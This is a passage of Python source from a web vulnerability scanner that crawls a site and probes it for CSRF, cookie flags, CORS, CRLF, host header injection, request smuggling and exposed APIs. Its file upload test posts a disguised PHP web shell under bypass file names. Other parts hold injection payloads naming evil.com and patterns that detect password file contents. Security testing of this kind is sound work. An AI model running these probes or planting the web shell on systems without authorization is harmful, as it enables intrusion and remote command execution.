                # If server didn't report Allow header, attempt lightweight probes (no destructive actions)
                # Probe for OPTIONS explicitly if not already done
                try:
                    probe = self.session.options(url, timeout=self.timeout)
                    time.sleep(self.rate_limit_delay)
                    probe_allow = probe.headers.get('Allow', '') or probe.headers.get('Public', '')
                    if probe_allow:
                        for m in re.split(r'[,\s]+', probe_allow.strip()):
                            if m:
                                methods.add(m.upper())
                        enabled = methods & dangerous
                        if enabled:
                            found_vulns.append({
                                'type': 'HTTP Methods Enabled (PUT/DELETE/OPTIONS)',
                                'severity': 'Medium',
                                'url': url,
                                'method': 'OPTIONS',
                                'payload': 'N/A',
                                'evidence': f"Allowed methods (probe): {', '.join(sorted(enabled))}"
                            })
                except Exception:
                    pass

        except Exception as e:
            self.log(f"HTTP methods check error: {e}", "debug")

        return found_vulns

    def test_csrf(self, url, forms):
        found_vulns = []
        for form in forms:
            has_csrf_token = any(
                i['type'] == 'hidden' and ('csrf' in i['name'].lower() or '_token' == i['name'].lower())
                for i in form['inputs']
            )
            if not has_csrf_token and form['method'] == 'post':
                found_vulns.append({"type": "Cross-Site Request Forgery (CSRF)", "severity": "High",
                    "url": form['action'], "method": "POST", "payload": "N/A",
                    "evidence": f"No apparent anti-CSRF token found in POST form at {form['action']}."})
        return found_vulns

    def test_auth_session(self, url, forms):
        found_vulns = []
        try:
            self.session.get(url, timeout=self.timeout)
            time.sleep(self.rate_limit_delay)
            for cookie in self.session.cookies:
                if not cookie.has_attr('httponly'):
                    found_vulns.append({"type": "Session Management Issues (Missing HttpOnly)", "severity": "Medium",
                        "url": url, "method": "GET", "payload": f"Cookie: {cookie.name}",
                        "evidence": f"Cookie '{cookie.name}' is missing HttpOnly flag."})
                if url.startswith('https://') and not cookie.secure:
                    found_vulns.append({"type": "Session Management Issues (Missing Secure Flag)", "severity": "Medium",
                        "url": url, "method": "GET", "payload": f"Cookie: {cookie.name}",
                        "evidence": f"Cookie '{cookie.name}' is missing Secure flag on HTTPS page."})
        except Exception as e:
            self.log(f"Auth/Session test error: {e}", "debug")
        for form in forms:
            if any(i['type'] == 'password' for i in form['inputs']):
                found_vulns.append({"type": "Weak Password Policy (Generic Check)", "severity": "Low",
                    "url": form['action'], "method": form['method'].upper(), "payload": "N/A",
                    "evidence": "Login form found; manual review needed for password policy strength."})
        try:
            res1 = requests.get(url, timeout=self.timeout)
            cookie1 = res1.headers.get('Set-Cookie')
            time.sleep(self.rate_limit_delay)
            res2 = requests.get(url, timeout=self.timeout)
            cookie2 = res2.headers.get('Set-Cookie')
            time.sleep(self.rate_limit_delay)
            if cookie1 and cookie2 and cookie1 == cookie2:
                found_vulns.append({"type": "Session Fixation (Basic Check)", "severity": "Medium",
                    "url": url, "method": "GET", "payload": "N/A",
                    "evidence": "Session cookie appears to be fixed across multiple unauthenticated requests."})
        except Exception as e:
            self.log(f"Session Fixation test error: {e}", "debug")
        return found_vulns

    def test_unvalidated_redirects(self, url, forms):
        found_vulns = []
        payloads = self.payloads.get('UnvalidatedRedirects', [])
        for payload in payloads:
            if '?' in url:
                for test_url in self._generate_param_injections(url, payload):
                    try:
                        res = self.session.get(test_url, allow_redirects=False, timeout=self.timeout)
                        time.sleep(self.rate_limit_delay)
                        if res.status_code in [301, 302, 303, 307, 308] and 'Location' in res.headers:
                            loc = res.headers['Location']
                            if payload in loc:
                                found_vulns.append({"type": "Unvalidated Redirects and Forwards", "severity": "Medium",
                                    "url": url, "method": "GET", "payload": payload,
                                    "evidence": f"Payload reflected in 'Location' header: {loc}"})
                    except Exception as e:
                        self.log(f"Redirect test error: {e}", "debug")
        for form in forms:
            for input_field in form['inputs']:
                if input_field['type'] not in ['text', 'url', 'search', 'textarea']:
                    continue
                for payload in payloads:
                    test_data = {i['name']: (payload if i['name'] == input_field['name'] else i['value']) for i in form['inputs']}
                    try:
                        if form['method'] == 'post':
                            res = self.session.post(form['action'], data=test_data, allow_redirects=False, timeout=self.timeout)
                        else:
                            res = self.session.get(f"{form['action']}?{self.safe_urlencode(test_data, doseq=True)}", allow_redirects=False, timeout=self.timeout)
                        time.sleep(self.rate_limit_delay)
                        if res.status_code in [301, 302, 303, 307, 308] and 'Location' in res.headers:
                            loc = res.headers['Location']
                            if payload in loc:
                                found_vulns.append({"type": "Unvalidated Redirects and Forwards", "severity": "Medium",
                                    "url": form['action'], "method": form['method'].upper(), "payload": payload,
                                    "evidence": f"Payload reflected in 'Location' header for form submission: {loc}"})
                    except Exception as e:
                        self.log(f"Redirect form test error: {e}", "debug")
        return found_vulns

    def test_cookie_manipulation(self, url, forms):
        found_vulns = []
        try:
            self.session.get(url, timeout=self.timeout)
            time.sleep(self.rate_limit_delay)
            for cookie in self.session.cookies:
                if not cookie.has_attr('httponly'):
                    found_vulns.append({"type": "Missing Cookie Attributes (HttpOnly/Secure)", "severity": "Medium",
                        "url": url, "method": "GET", "payload": f"Cookie: {cookie.name}",
                        "evidence": f"Cookie '{cookie.name}' is missing HttpOnly flag."})
                if url.startswith('https://') and not cookie.secure:
                    found_vulns.append({"type": "Missing Cookie Attributes (HttpOnly/Secure)", "severity": "Medium",
                        "url": url, "method": "GET", "payload": f"Cookie: {cookie.name}",
                        "evidence": f"Cookie '{cookie.name}' is missing Secure flag on HTTPS page."})
                if not cookie.has_attr('samesite'):
                    found_vulns.append({"type": "Missing Cookie Attributes (SameSite)", "severity": "Low",
                        "url": url, "method": "GET", "payload": f"Cookie: {cookie.name}",
                        "evidence": f"Cookie '{cookie.name}' is missing SameSite attribute."})
        except Exception as e:
            self.log(f"Cookie Manipulation test error: {e}", "debug")
        return found_vulns

    def test_clickjacking(self, url, forms=None):
        found_vulns = []
        try:
            res = self.session.get(url, timeout=self.timeout)
            time.sleep(self.rate_limit_delay)
            if 'X-Frame-Options' not in res.headers:
                found_vulns.append({"type": "Clickjacking", "severity": "Medium",
                    "url": url, "method": "GET", "payload": "N/A",
                    "evidence": "X-Frame-Options header is missing, allowing page to be framed."})
            elif res.headers['X-Frame-Options'].lower() not in ['deny', 'sameorigin']:
                found_vulns.append({"type": "Clickjacking", "severity": "Medium",
                    "url": url, "method": "GET", "payload": "N/A",
                    "evidence": f"X-Frame-Options set to '{res.headers['X-Frame-Options']}', not 'DENY' or 'SAMEORIGIN'."})
        except Exception as e:
            self.log(f"Clickjacking test error: {e}", "debug")
        return found_vulns

    def test_broken_access_control(self, url, forms):
        found_vulns = []
        admin_paths = self.payloads.get('BrokenAccessControl', [])
        for path in admin_paths:
            test_url = urljoin(url, path)
            try:
                res = self.session.get(test_url, timeout=self.timeout)
                time.sleep(self.rate_limit_delay)
                if res.status_code == 200 and len(res.text) > 100 and "login" not in res.url.lower():
                    found_vulns.append({"type": "Broken Access Control (URL Tampering)", "severity": "High",
                        "url": test_url, "method": "GET", "payload": path,
                        "evidence": f"Accessed potentially protected path '{path}' without authentication."})
            except Exception as e:
                self.log(f"Broken Access Control test error: {e}", "debug")
        found_vulns.extend(self.test_idor(url, forms))
        return found_vulns

    def test_password_brute_force(self, url, forms):
        found_vulns = []
        for form in forms:
            username_field = None
            password_field = None
            for input_field in form['inputs']:
                if input_field['type'] == 'password':
                    password_field = input_field['name']
                elif input_field['type'] in ['text', 'email'] and 'user' in input_field['name'].lower():
                    username_field = input_field['name']
            if password_field and username_field:
                found_vulns.append({"type": "Password Brute-Force Weaknesses", "severity": "Medium",
                    "url": form['action'], "method": form['method'].upper(), "payload": "N/A",
                    "evidence": "Login form detected. Absence of rate limiting or account lockout needs manual verification."})
        return found_vulns

    def test_file_upload_vulns(self, url, forms):
        found_vulns = []
        bypass_names = [
            ('shell.php', 'application/octet-stream'),
            ('shell.php.jpg', 'image/jpeg'),
            ('shell.phtml', 'image/jpeg'),
            ('shell.php5', 'image/jpeg'),
            ('shell.shtml', 'image/jpeg'),
        ]
        for form in forms:
            file_inputs = [i for i in form['inputs'] if i.get('type') == 'file']
            if not file_inputs:
                continue
            # First flag detection
            found_vulns.append({
                "type": "File Upload Vulnerability (Basic Detection)", "severity": "High",
                "url": form['action'], "method": form['method'].upper(), "payload": "N/A",
                "evidence": "File upload form detected. Manual testing for extension bypass and content-type bypass recommended."
            })
            # Try extension bypass
            for input_field in file_inputs:
                for fname, ftype in bypass_names[:2]:  # limit to 2 attempts
                    try:
                        import io
                        # Minimal PHP webshell content disguised
                        fake_content = b'GIF89a<?php echo shell_exec($_GET["cmd"]); ?>'
                        files = {input_field['name']: (fname, io.BytesIO(fake_content), ftype)}
                        other_data = {i['name']: i.get('value', 'test') for i in form['inputs'] 
                                      if i.get('type') != 'file' and i.get('name')}
                        res = self.session.post(form['action'], files=files, data=other_data, timeout=self.timeout)
                        time.sleep(self.rate_limit_delay)
                        # Check if server accepted without validation error
                        if res.status_code in [200, 201, 302] and not any(
                            err in res.text.lower() for err in 
                            ['not allowed', 'invalid', 'rejected', 'not permitted', 'error', 'only']
                        ):
                            found_vulns.append({
                                "type": "File Upload (Extension Bypass)", "severity": "Critical",
                                "url": form['action'], "method": "POST",
                                "payload": fname,
                                "evidence": f"Server accepted file '{fname}' with Content-Type '{ftype}' without apparent validation. Manual verification of execution required."
                            })
                            break
                    except Exception as e:
                        self.log(f"File upload bypass test error: {e}", "debug")
        return found_vulns

    def _generic_payload_test(self, payload_key, url, forms):
        """Generic tester for payload groups in payloads.json with reduced false positives.
        Only tests non-dict payloads; skips complex structures (DefaultCredentials, SecurityHeaders, CloudMetadata).
        Uses stricter evidence checks to reduce false positives.
        """
        found_vulns = []
        payloads_raw = self.payloads.get(payload_key, []) or []
        
        # Skip dict-based payload groups (they need specialized testing)
        if isinstance(payloads_raw, dict):
            return found_vulns
        if not isinstance(payloads_raw, list):
            return found_vulns
        
        payloads = payloads_raw

        payload_to_vuln_name = {
            'XXE': 'XML External Entity (XXE)',
            'LDAPInjection': 'LDAP Injection',
            'XPathInjection': 'XPath Injection',
            'NoSQLInjection': 'NoSQL Injection',
            'TemplateInjection': 'Server-Side Template Injection (SSTI)',
            'HostHeaderInjection': 'Host Header Injection',
            'CORSBypass': 'CORS Misconfiguration',
            'JWT': 'JWT Security Issues',
            'WebSocket': 'WebSocket Message Tampering',
            'GraphQL': 'GraphQL Introspection Enabled',
            'SAML': 'SAML Vulnerabilities',
            'CachePoisoning': 'Web Cache Poisoning',
            'BusinessLogic': 'Business Logic Error (Simple Case)',
            'ReDoS': 'ReDoS',
            'DenialOfService': 'Denial of Service',
            'SubdomainTakeover': 'Subdomain Takeover',
            'FileUploadBypass': 'File Upload Vulnerability (Basic Extension Bypass)',
            'WordPress': 'WordPress Disclosure',
            'APIEndpoints': 'Insecure API Exposure',
            'CloudMetadata': 'SSRF (Cloud Metadata)',
            'CommandInjection': 'OS Command Injection',
            'RFI': 'Remote File Inclusion (RFI)',
            'OpenRedirectPayloads': 'Open Redirect',
            'FourZeroThreeBypass': 'Broken Access Control (URL Tampering)',
            'PathTraversal': 'Local File Inclusion (LFI)',
            'HTTPMethods': 'HTTP Methods Enabled (PUT/DELETE/OPTIONS)'
        }
        vuln_type = payload_to_vuln_name.get(payload_key, f"{payload_key} (Potential)")

        # Skip payloads that require specialized detection or are handled by dedicated tests
        skip_keys = {'DefaultCredentials', 'SecurityHeaders', 'CloudMetadata', 'HTTPMethods',
                     'CRLF', 'HostHeaderInjection', 'CORS_Origins', 'CORSBypass', 'OAuth',
                     'MassAssignment', 'RaceCondition', 'IDORNumeric'}
        if payload_key in skip_keys:
            return found_vulns

        # GET parameter injection checks (limit to first 3 payloads to avoid false positives)
        try:
            if '?' in url:
                for payload in payloads[:3]:  # Limit iterations
                    try:
                        for test_url in self._generate_param_injections(url, payload):
                            try:
                                res = self.session.get(test_url, timeout=self.timeout)
                                time.sleep(self.rate_limit_delay)
                                text = res.text or ''
                                # Require exact payload match AND additional context (not just any occurrence)
                                if payload and payload in text:
                                    # Additional filter: check for evidence of successful injection
                                    if self._is_strong_injection_evidence(payload_key, payload, text):
                                        found_vulns.append({
                                            'type': vuln_type,
                                            'severity': 'High',
                                            'url': url,
                                            'method': 'GET',
                                            'payload': payload[:100],  # Limit payload display
                                            'evidence': 'Payload reflected with strong injection indicators.'
                                        })
                                        return found_vulns  # Return early to avoid duplicates
                            except Exception:
                                continue
                    except Exception:
                        continue
        except Exception:
            pass

        # Form-based checks (limit iterations)
        for form in (forms or []):
            if len(found_vulns) > 0:
                break
            for payload in payloads[:2]:  # Limit to first 2 payloads per form
                try:
                    test_data = {}
                    for i in form.get('inputs', []):
                        name = i.get('name')
                        if not name:
                            continue
                        if i.get('type') in ['text', 'search', 'email', 'password', 'number', 'textarea', 'url']:
                            test_data[name] = payload
                        else:
                            test_data[name] = i.get('value', '')
                    try:
                        if form.get('method') == 'post':
                            res = self.session.post(form.get('action'), data=test_data, timeout=self.timeout)
                        else:
                            res = self.session.get(f"{form.get('action')}?{self.safe_urlencode(test_data, doseq=True)}", timeout=self.timeout)
                        time.sleep(self.rate_limit_delay)
                        text = res.text or ''
                        if payload and payload in text:
                            if self._is_strong_injection_evidence(payload_key, payload, text):
                                found_vulns.append({
                                    'type': vuln_type,
                                    'severity': 'High',
                                    'url': form.get('action'),
                                    'method': form.get('method', 'get').upper(),
                                    'payload': payload[:100],
                                    'evidence': 'Payload reflected in form response with injection indicators.'
                                })
                                return found_vulns
                    except Exception:
                        continue
                except Exception:
                    continue

        return found_vulns

    def _is_strong_injection_evidence(self, payload_key, payload, response_text):
        """Check for strong indicators of successful injection based on payload type."""
        text = response_text.lower()
        
        # XXE indicators
        if payload_key == 'XXE':
            return any(x in text for x in ['root:', 'daemon:', '/etc/', 'system32', 'entity', 'deprecated'])
        
        # LDAP indicators
        if payload_key == 'LDAPInjection':
            return any(x in text for x in ['uid=', 'cn=', 'objectclass', 'ldaperror', 'invalid']) or '*)' in response_text
        
        # XPath indicators
        if payload_key == 'XPathInjection':
            return any(x in text for x in ['xpath', 'xml', 'node', 'element', 'libxml'])
        
        # NoSQL indicators
        if payload_key == 'NoSQLInjection':
            return any(x in text for x in ['mongodb', 'nosql', 'document', 'collection', '$where']) or '{' in response_text and '"' in response_text
        
        # SSTI indicators
        if payload_key == 'TemplateInjection':
            return any(x in text for x in ['jinja', 'freemarker', 'template', 'expression', 'eval', '__class__'])
        
        # Command injection indicators
        if payload_key == 'CommandInjection':
            return any(x in text for x in ['uid=', 'gid=', 'groups=', 'root:', 'daemon:', 
                                             'windows ip', 'ttl=', 'bytes from',
                                             'volume in drive', 'directory of'])
        
        # RFI indicators
        if payload_key == 'RFI':
            return any(x in text for x in ['root:', 'passwd', '<?php', 'eval(', 
                                             'system(', 'shell_exec('])
        
        # Path traversal indicators
        if payload_key == 'PathTraversal':
            return any(x in text for x in ['root:x:', 'daemon:x:', 'bin:x:', 
                                             'system32', 'win.ini', '[boot',
                                             'apache.conf', 'nginx.conf'])
        
        # Open redirect indicators
        if payload_key == 'OpenRedirectPayloads':
            return any(x in text for x in ['location:', 'redirect', 'href=', 'evil.com', 'javascript:'])
        
        # Deserialization indicators
        if payload_key == 'InsecureDeserialization':
            return any(x in text for x in ['exception', 'serializ', 'deserializ', 'java.io', 'classnotfound', 'unserialize'])
        
        # Prototype pollution indicators
        if payload_key == 'PrototypePollution':
            return any(x in text for x in ['__proto__', 'prototype', 'constructor', 'admin', 'true']) and len(response_text) > 10
        
        # SSI indicators
        if payload_key == 'ServerSideInclude':
            return any(x in text for x in ['uid=', 'gid=', 'root:', '/etc/', 'apache', 'date_local'])
        
        # HTTP smuggling indicators
        if payload_key == 'HTTPRequestSmuggling':
            return any(x in text for x in ['transfer-encoding', 'content-length', '400 bad request', 'invalid request'])

        # Default: just check for payload reflection (but mark as Medium severity)
        return True

    def test_crlf_injection(self, url, forms):
        """Test for CRLF Injection via URL parameters."""
        found_vulns = []
        payloads = self.payloads.get('CRLF', [
            '%0d%0aSet-Cookie: crlf=injection',
            '%0d%0aLocation: https://evil.com',
            '%0aContent-Length: 0%0a%0a',
        ])
        for payload in payloads:
            if '?' in url:
                for test_url in self._generate_param_injections(url, payload):
                    try:
                        res = self.session.get(test_url, allow_redirects=False, timeout=self.timeout)
                        time.sleep(self.rate_limit_delay)
                        # Check if injected header appears in response
                        if 'crlf' in res.headers.get('Set-Cookie', '').lower() or \
                           'crlf' in str(res.headers).lower():
                            found_vulns.append({
                                'type': 'CRLF Injection',
                                'severity': 'High',
                                'url': url,
                                'method': 'GET',
                                'payload': payload,
                                'evidence': 'Injected header reflected in HTTP response headers.'
                            })
                            return found_vulns
                    except Exception as e:
                        self.log(f'CRLF test error: {e}', 'debug')
        return found_vulns

    def test_host_header_injection(self, url, forms=None):
        """Test for Host Header Injection."""
        found_vulns = []
        evil_hosts = ['evil.com', 'attacker.com', 'localhost:8888']
        try:
            for evil_host in evil_hosts[:1]:  # limit to 1 to reduce noise
                headers = {'Host': evil_host}
                res = self.session.get(url, headers=headers, timeout=self.timeout, allow_redirects=False)
                time.sleep(self.rate_limit_delay)
                # If the evil host appears reflected in the response body or Location header
                if evil_host in res.text or evil_host in res.headers.get('Location', ''):
                    found_vulns.append({
                        'type': 'Host Header Injection',
                        'severity': 'Medium',
                        'url': url,
                        'method': 'GET',
                        'payload': f'Host: {evil_host}',
                        'evidence': f'Injected Host header value "{evil_host}" reflected in server response.'
                    })
                    return found_vulns
        except Exception as e:
            self.log(f'Host Header Injection test error: {e}', 'debug')
        return found_vulns

    def test_autocomplete(self, url, forms):
        """Check for autocomplete enabled on sensitive form fields."""
        found_vulns = []
        sensitive_types = ['password', 'email', 'tel', 'credit-card', 'card']
        sensitive_names = ['password', 'passwd', 'pass', 'card', 'cvv', 'ssn',
                           'credit', 'secret', 'token', 'pin', 'dob', 'birth']
        for form in forms:
            for inp in form.get('inputs', []):
                itype = (inp.get('type') or '').lower()
                iname = (inp.get('name') or '').lower()
                if itype == 'password' or any(s in iname for s in sensitive_names):
                    # Check if autocomplete is NOT explicitly set to off
                    autocomplete = inp.get('autocomplete', '').lower()
                    if autocomplete != 'off':
                        found_vulns.append({
                            'type': 'Autocomplete Enabled on Sensitive Forms',
                            'severity': 'Low',
                            'url': form['action'],
                            'method': form['method'].upper(),
                            'payload': 'N/A',
                            'evidence': f"Sensitive field '{inp.get('name')}' (type={itype}) does not have autocomplete='off'."
                        })
        return found_vulns

    def test_cors(self, url, forms=None):
        """Test for CORS misconfiguration."""
        found_vulns = []
        try:
            # Test multiple bypass techniques
            evil_origins = [
                'https://evil-attacker.com',
                'null',  # null origin bypass
            ]
            evil_origin = evil_origins[0]
            headers = {'Origin': evil_origin}
            res = self.session.get(url, headers=headers, timeout=self.timeout)
            time.sleep(self.rate_limit_delay)
            acao = res.headers.get('Access-Control-Allow-Origin', '')
            acac = res.headers.get('Access-Control-Allow-Credentials', '')
            if acao == '*':
                found_vulns.append({
                    'type': 'CORS Misconfiguration',
                    'severity': 'Medium',
                    'url': url,
                    'method': 'GET',
                    'payload': f'Origin: {evil_origin}',
                    'evidence': "Server responds with 'Access-Control-Allow-Origin: *', allowing any origin to read responses."
                })
            elif evil_origin in acao:
                sev = 'High' if acac.lower() == 'true' else 'Medium'
                found_vulns.append({
                    'type': 'CORS Misconfiguration',
                    'severity': sev,
                    'url': url,
                    'method': 'GET',
                    'payload': f'Origin: {evil_origin}',
                    'evidence': f"Server reflects arbitrary Origin '{evil_origin}' in ACAO header"
                              + (" with credentials allowed." if acac.lower() == 'true' else ".")
                })
        except Exception as e:
            self.log(f'CORS test error: {e}', 'debug')
        return found_vulns

    # ─── Additional Comprehensive Vulnerability Tests ─────────────────────────
    
    def test_xxe(self, url, forms):
        """Test for XML External Entity (XXE) injection."""
        return self._generic_payload_test('XXE', url, forms)

    def test_ldap_injection(self, url, forms):
        """Test for LDAP Injection."""
        return self._generic_payload_test('LDAPInjection', url, forms)

    def test_xpath_injection(self, url, forms):
        """Test for XPath Injection."""
        return self._generic_payload_test('XPathInjection', url, forms)

    def test_nosql_injection(self, url, forms):
        """Test for NoSQL Injection."""
        return self._generic_payload_test('NoSQLInjection', url, forms)

    def test_ssti(self, url, forms):
        """Test for Server-Side Template Injection (SSTI)."""
        return self._generic_payload_test('TemplateInjection', url, forms)

    def test_rfi(self, url, forms):
        """Test for Remote File Inclusion (RFI)."""
        return self._generic_payload_test('RFI', url, forms)

    def test_command_injection(self, url, forms):
        """Test for OS Command Injection."""
        return self._generic_payload_test('CommandInjection', url, forms)

    def test_path_traversal(self, url, forms):
        """Test for Path Traversal (Local File Inclusion)."""
        return self._generic_payload_test('PathTraversal', url, forms)

    def test_open_redirect(self, url, forms):
        """Test for Open Redirect vulnerabilities."""
        return self._generic_payload_test('OpenRedirectPayloads', url, forms)

    def test_prototype_pollution(self, url, forms):
        """Test for Prototype Pollution."""
        found_vulns = []
        props = ['__proto__', 'constructor', 'prototype']
        test_payload = 'test=value&__proto__[admin]=true'
        
        for form in forms:
            try:
                test_data = {prop: 'true' for prop in props}
                test_data['x'] = 'y'
                
                if form.get('method') == 'post':
                    res = self.session.post(form.get('action'), data=test_data, timeout=self.timeout)
                else:
                    res = self.session.get(f"{form.get('action')}?{self.safe_urlencode(test_data, doseq=True)}", timeout=self.timeout)
                time.sleep(self.rate_limit_delay)
                
                # Only flag if the injected value is REFLECTED back (not common framework text)
                if 'true' in res.text and ('admin' in res.text.lower() or 'polluted' in res.text.lower()) and \
                   res.status_code == 200:
                    found_vulns.append({
                        'type': 'Prototype Pollution',
                        'severity': 'High',
                        'url': form.get('action'),
                        'method': form.get('method', 'GET').upper(),
                        'payload': test_payload,
                        'evidence': 'Prototype pollution indicators detected in response.'
                    })
                    return found_vulns
            except Exception:
                continue
        return found_vulns

    def test_http_smuggling(self, url, forms=None):
        """Test for HTTP Request Smuggling."""
        found_vulns = []
        try:
            # Test 1: Send ambiguous Transfer-Encoding header
            # If server accepts TE:chunked,chunked without error → potentially vulnerable (no strict validation)
            headers_te = {'Transfer-Encoding': 'chunked, chunked', 'Content-Length': '0'}
            try:
                res = self.session.get(url, headers=headers_te, timeout=self.timeout)
                time.sleep(self.rate_limit_delay)
                # Server that strictly rejects → returns 400 (not vulnerable)
                # Server that accepts → returns 200/302/etc (potentially vulnerable front-end)
                if res.status_code not in [400, 501]:
                    found_vulns.append({
                        'type': 'HTTP Request Smuggling',
                        'severity': 'High',
                        'url': url,
                        'method': 'GET',
                        'payload': 'Transfer-Encoding: chunked, chunked',
                        'evidence': f'Server accepted ambiguous Transfer-Encoding header (status {res.status_code}) without rejection — front-end may not validate TE strictly, indicating potential CL.TE or TE.CL smuggling surface.'
                    })
            except Exception:
                pass

            # Test 2: Conflicting Content-Length and Transfer-Encoding
            headers_conflict = {'Transfer-Encoding': 'chunked', 'Content-Length': '5'}
            try:
                res2 = self.session.post(url, data='0\r\n\r\n', headers=headers_conflict, timeout=self.timeout)
                time.sleep(self.rate_limit_delay)
                if res2.status_code not in [400, 501]:
                    found_vulns.append({
                        'type': 'HTTP Request Smuggling',
                        'severity': 'High',
                        'url': url,
                        'method': 'POST',
                        'payload': 'Content-Length: 5 + Transfer-Encoding: chunked (conflict)',
                        'evidence': f'Server accepted conflicting Content-Length/Transfer-Encoding headers (status {res2.status_code}). Manual verification with Burp Suite HTTP Request Smuggler recommended.'
                    })
            except Exception:
                pass
        except Exception as e:
            self.log(f'HTTP Smuggling test error: {e}', 'debug')
        return found_vulns

    def test_api_exposure(self, url, forms=None):
        """Test for insecure API endpoints - focuses on sensitive unauthenticated exposure."""
        found_vulns = []
        # These paths are sensitive - they should require auth or not exist at all
        sensitive_api_paths = [
            '/api/v1/users', '/api/v2/users', '/api/users',
            '/api/v1/admin', '/api/v2/admin', '/api/admin',
            '/api/v1/accounts', '/api/v1/secrets',
            '/graphql', '/graphiql', '/graphql/playground',
            '/swagger.json', '/swagger.yaml', '/openapi.json', '/openapi.yaml',
            '/api-docs', '/api/docs', '/api/swagger',
            '/api/v1/keys', '/api/v1/tokens',
            '/rest/api/latest/myself',  # Jira
            '/api/v4/users',  # GitLab
        ]
        sensitive_data_indicators = [
            'password', 'secret', 'token', 'api_key', 'apikey',
            'private_key', 'access_key', 'auth', 'credential',
            '"id":', '"email":', '"username":', '"role":', '"admin":'
        ]
        base_url = url.split('?')[0].rstrip('/')
        # Only test from domain root
        from urllib.parse import urlparse
        parsed = urlparse(url)
        root_url = f"{parsed.scheme}://{parsed.netloc}"

        try:
            for path in sensitive_api_paths:
                test_url = root_url + path
                try:
                    res = self.session.get(test_url, timeout=self.timeout)
                    time.sleep(self.rate_limit_delay)
                    
                    if res.status_code in [200, 201] and len(res.text) > 50:
                        ct = res.headers.get('Content-Type', '').lower()
                        is_json = 'json' in ct or (res.text.strip().startswith(('{', '[')))
                        text_lower = res.text.lower()
                        has_sensitive = any(ind in text_lower for ind in sensitive_data_indicators)
                        
                        if is_json and has_sensitive:
                            found_vulns.append({
                                'type': 'Insecure API Exposure',
                                'severity': 'High',
                                'url': test_url,
                                'method': 'GET',
                                'payload': f'Unauthenticated GET {path}',
                                'evidence': f'API endpoint at {path} returned sensitive JSON data without authentication.'
                            })
                        elif path in ['/swagger.json', '/swagger.yaml', '/openapi.json', '/openapi.yaml', '/api-docs'] and res.status_code == 200:
                            found_vulns.append({
                                'type': 'Information Disclosure (API Schema Exposure)',
                                'severity': 'Medium',
                                'url': test_url,
                                'method': 'GET',
                                'payload': f'GET {path}',
                                'evidence': f'API schema/documentation endpoint accessible at {path} — exposes all endpoint paths, parameters, and data models.'
                            })
                        elif path in ['/graphql', '/graphiql', '/graphql/playground'] and res.status_code == 200:
                            found_vulns.append({
                                'type': 'GraphQL Introspection Enabled',
                                'severity': 'Medium',
                                'url': test_url,
                                'method': 'GET',
                                'payload': f'GET {path}',
                                'evidence': f'GraphQL endpoint accessible at {path}. If introspection is enabled, the full schema can be enumerated.'
                            })
                except Exception:
                    continue
        except Exception as e:
            self.log(f'API exposure test error: {e}', 'debug')
        
        return found_vulns[:1]  # Return only first finding

    def test_debug_mode(self, url, forms=None):
        """Test for debug mode or verbose error messages."""
        found_vulns = []
        debug_params = ['debug=true', 'debug=1', 'env=development', 'mode=debug']
        debug_indicators = ['traceback', 'stack trace', 'exception', 'stack overflow', 
                            'line number', 'error on line', 'at line']
        
        try:
            for param in debug_params[:2]:
                if '?' in url:
                    test_url = url + '&' + param
                else:
                    test_url = url + '?' + param
                    
                try:
                    res = self.session.get(test_url, timeout=self.timeout)
                    time.sleep(self.rate_limit_delay)
                    text = res.text.lower()
                    
                    if any(ind in text for ind in debug_indicators):
                        found_vulns.append({
                            'type': 'Information Disclosure (Debug Mode)',
                            'severity': 'High',
                            'url': test_url,
                            'method': 'GET',
                            'payload': param,
                            'evidence': 'Debug information or detailed error messages exposed.'
                        })
                        return found_vulns
                except Exception:
                    continue
        except Exception as e:
            self.log(f'Debug mode test error: {e}', 'debug')
        
        return found_vulns

    def test_sensitive_data_exposure(self, url, forms=None):
        """Test for hardcoded sensitive data."""
        found_vulns = []
        sensitive_patterns = [
            r'api[_-]?key\s*[:=]',
            r'secret\s*[:=]',
            r'password\s*[:=]',
            r'token\s*[:=]',
            r'private[_-]?key',
            r'aws[_-]?key',
            r'stripe[_-]?key'
        ]
        
        try:
            res = self.session.get(url, timeout=self.timeout)
            time.sleep(self.rate_limit_delay)
            text = res.text
            
            import re
            for pattern in sensitive_patterns:
                if re.search(pattern, text, re.IGNORECASE):
                    found_vulns.append({
                        'type': 'Sensitive Data Exposure',
                        'severity': 'Critical',
                        'url': url,
                        'method': 'GET',
                        'payload': 'Static analysis',
                        'evidence': 'Potential sensitive credentials found in source code.'
                    })
                    return found_vulns
        except Exception as e:
            self.log(f'Sensitive data test error: {e}', 'debug')
        
        return found_vulns

    def scan_page(self, url, current_depth=0):
        try:
            normalized_url = self.normalize_url(url)
        except Exception as e:
            self.log(f"Error normalizing URL {url}: {e}", "debug")
            self.scanned_pages_count += 1
            self.update_progress()
            return
            
        if normalized_url in self.checked_urls:
            return
        if not self.should_scan_url(url):
            self.scanned_pages_count += 1
            self.update_progress()
            return
        self.checked_urls.add(normalized_url)
        self.log(f"Scanning: {url} (Depth: {current_depth})", "info")
        try:
            res = self.session.get(url, timeout=self.timeout)
            res.encoding = 'utf-8'  # Force UTF-8 encoding
            time.sleep(self.rate_limit_delay)
            
            # Handle potential encoding issues with response text
            try:
                page_text = res.text
            except (UnicodeDecodeError, AttributeError):
                # Fallback: try with different encodings
                try:
                    page_text = res.content.decode('utf-8', errors='ignore')
                except Exception:
                    page_text = res.content.decode('latin-1', errors='ignore')
            
            soup = BeautifulSoup(page_text, 'html.parser')
            forms = self._get_forms(soup, url)
            page_findings = []
            with ThreadPoolExecutor(max_workers=len(self.vulnerability_tests)) as executor:
                futures = [executor.submit(test_func, url, forms) for test_func in self.vulnerability_tests.values()]
                for future in as_completed(futures):
                    try:
                        results = future.result()
                        if results:
                            page_findings.extend(results)
                    except Exception as e:
                        self.log(f"Error during vulnerability test on {url}: {e}", "debug")
            for finding in page_findings:
                self.add_vulnerability(finding)
            self.scanned_pages_count += 1
            self.update_progress()
            if current_depth < self.max_depth:
                links_to_crawl = []
                for link in soup.find_all(['a', 'iframe'], href=True):
                    href = link.get('href')
                    if not href or href.startswith(('javascript:', 'mailto:', 'tel:', '#')):
                        continue
                    try:
                        full_url = urljoin(url, href)
                        if self.should_scan_url(full_url):
                            links_to_crawl.append(full_url)
                    except Exception as e:
                        # Skip URLs that cause issues
                        self.log(f"Error processing URL {href}: {e}", "debug")
                        continue
                with ThreadPoolExecutor(max_workers=self.max_threads) as executor:
                    futures = [executor.submit(self.scan_page, link, current_depth + 1) for link in links_to_crawl]
                    for future in as_completed(futures):
                        try:
                            future.result()
                        except Exception as e:
                            self.log(f"Error in child scanning thread: {e}", "debug")
